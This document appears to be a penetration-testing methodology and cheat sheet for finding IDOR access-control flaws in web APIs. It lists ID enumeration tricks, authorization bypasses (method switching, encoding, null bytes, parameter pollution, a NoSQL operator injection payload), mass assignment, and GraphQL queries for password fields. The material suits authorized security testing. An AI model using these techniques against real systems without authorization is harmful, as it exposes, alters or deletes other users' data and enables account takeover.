# IDOR (Insecure Direct Object Reference) Testing Methodology

## Quick Reference

**Common Vulnerable Parameters:**
```
id, user_id, account_id
order_id, invoice_id
file, document, report
uuid, guid
```

**Basic Test:**
1. Capture request with your object ID
2. Change ID to another user's object
3. Check if access granted

---

## IDOR Types

### Horizontal IDOR
Access resources of users at same privilege level.
- User A accesses User B's profile
- User A reads User B's messages

### Vertical IDOR
Access resources of users at higher privilege level.
- Regular user accesses admin functions
- User accesses internal reports

---

## Common Vulnerable Endpoints

### User Data
```
GET /api/users/123
GET /api/profile?user_id=123
GET /api/account/123/settings
POST /api/users/123/update
DELETE /api/users/123
```

### Documents/Files
```
GET /api/documents/456
GET /download?file_id=456
GET /api/invoices/789
GET /api/reports/report_123.pdf
```

### Orders/Transactions
```
GET /api/orders/789
GET /api/transactions/1234
GET /api/payments/5678
GET /api/receipts/9012
```

### Messages/Communications
```
GET /api/messages/conversation/123
GET /api/inbox/message/456
GET /api/tickets/789
```

---

## Parameter Locations

### URL Path
```
/api/users/123 → /api/users/124
/users/123/profile → /users/124/profile
```

### Query Parameters
```
/api/user?id=123 → /api/user?id=124
/download?file=report_123.pdf → /download?file=report_124.pdf
```

### Request Body
```json
{"user_id": 123} → {"user_id": 124}
{"order_id": "ORD-001"} → {"order_id": "ORD-002"}
```

### Headers
```
X-User-Id: 123 → X-User-Id: 124
```

### Cookies
```
user_session=123 → user_session=124
```

---

## ID Types and Enumeration

### Sequential Integers
```
id=1 → id=2 → id=3
```

Easy to enumerate. Try:
- Current ID ± 1
- ID = 1 (often admin/first user)
- Very high numbers
- Negative numbers

### UUIDs/GUIDs
```
550e8400-e29b-41d4-a716-446655440000
```

Harder to enumerate but:
- Check if leaked elsewhere (logs, responses, referrer)
- Check if predictable (timestamp-based)
- Check other endpoints for UUID disclosure

### Encoded IDs

**Base64:**
```
MTIz → 123 (decode, modify, re-encode)
```

**Hex:**
```
7b → 123
```

**Custom encoding:**
- Analyze multiple IDs to find pattern

### Hashed IDs

**MD5/SHA1 of sequential values:**
```
c4ca4238a0b923820dcc509a6f75849b → MD5(1)
```

If pattern found, precompute hashes

### Composite IDs
```
user_123_doc_456
ORD-2024-00123
```

Try modifying each component

---

## Testing Techniques

### Basic ID Substitution

1. Create two accounts (A and B)
2. Create resource with Account A
3. Note the resource ID
4. Login as Account B
5. Try to access Account A's resource

### ID in Multiple Parameters

Check all ID-like parameters:
```
GET /api/user/123/document/456
```
Try changing both user ID and document ID

### Blind IDOR

When no direct feedback:
- Modify resource as another user
- Delete resource as another user
- Check if action succeeded via other means

### IDOR via HTTP Methods

Resource accessible via one method but not another:
```
GET /api/users/123 → 403 Forbidden
PUT /api/users/123 → 200 OK (IDOR!)
```

### IDOR via Different Endpoints

Same resource, different access controls:
```
/api/v1/users/123 → 403
/api/v2/users/123 → 200
/internal/users/123 → 200
/users/123.json → 200
```

### Parameter Pollution

```
GET /api/user?id=123&id=456
```

Some frameworks take first, others take last

### Array/Batch Endpoints

```json
POST /api/users/batch
{"ids": [123, 456, 789]}
```

May bypass per-request authorization

---

## Bypass Techniques

### Change Request Method
```
GET /api/user/123 → 403
POST /api/user/123 → 200
```

### Add/Remove Parameters
```
/api/user/123 → 403
/api/user/123?admin=true → 200
```

### Case Sensitivity
```
/api/User/123
/API/user/123
```

### URL Encoding
```
/api/user/123 → /api/user/%31%32%33
```

### Path Traversal in ID
```
/api/user/./123
/api/user/123/../456
```

### Null Byte
```
/api/user/123%00
/api/user/123%00.json
```

### JSON Parameter Pollution
```json
{"id": 123, "id": 456}
```

### Wrap ID in Array
```json
{"id": [123]}
{"ids": 123}
```

### String vs Integer
```json
{"id": 123} → {"id": "123"}
{"id": "123"} → {"id": 123}
```

### Object Injection
```json
{"id": {"$gt": 0}}  // NoSQL
```

---

## Mass Assignment + IDOR

Modify fields you shouldn't:

```json
PUT /api/users/123
{"name": "Test", "role": "admin", "owner_id": 456}
```

---

## IDOR in File Operations

### File Download
```
/download?file=user_123_report.pdf → /download?file=user_456_report.pdf
/files/123/document.pdf → /files/456/document.pdf
```

### File Upload
```
POST /upload?folder_id=123 → POST /upload?folder_id=456
```

### File Delete
```
DELETE /api/files/123 → DELETE /api/files/456
```

---

## IDOR in Multi-Tenant Applications

### Organization/Tenant ID
```
/api/org/123/users → /api/org/456/users
```

### Subdomain-Based
```
tenant1.app.com/api/users → tenant2.app.com/api/users
```

### Header-Based
```
X-Tenant-Id: 123 → X-Tenant-Id: 456
```

---

## GraphQL IDOR

### Query with ID
```graphql
query {
  user(id: "123") {
    email
    password
  }
}
```

### Nested Objects
```graphql
query {
  user(id: "123") {
    documents {
      id
      content
    }
  }
}
```

### Mutations
```graphql
mutation {
  updateUser(id: "123", data: {role: "admin"}) {
    id
  }
}
```

---

## Finding IDs

### In Responses
Check API responses for other users' IDs

### In JavaScript
Search frontend code for ID patterns

### In Cookies/Tokens
Decode JWTs, session tokens

### In Error Messages
Verbose errors may leak IDs

### Via Enumeration
If sequential, enumerate

### Via Social Engineering
Profile URLs, shared links

---

## Impact Demonstration

### Data Exposure
- Read sensitive user data
- Access private documents
- View financial information

### Data Modification
- Modify other users' profiles
- Change account settings
- Update permissions

### Data Deletion
- Delete other users' resources
- Remove account data

### Account Takeover
- Change email/password
- Modify security settings

---

## Verification Checklist

1. **Identify object references:**
   - [ ] Map all endpoints with IDs
   - [ ] Note ID formats (int, UUID, encoded)

2. **Test horizontal access:**
   - [ ] Access same-privilege user's resources
   - [ ] Modify another user's data
   - [ ] Delete another user's resources

3. **Test vertical access:**
   - [ ] Access admin resources as regular user
   - [ ] Access internal endpoints

4. **Test bypass techniques:**
   - [ ] Different HTTP methods
   - [ ] Parameter manipulation
   - [ ] Encoding variations

5. **Document evidence:**
   - [ ] Screenshot of unauthorized access
   - [ ] Working request/response
   - [ ] Impact description
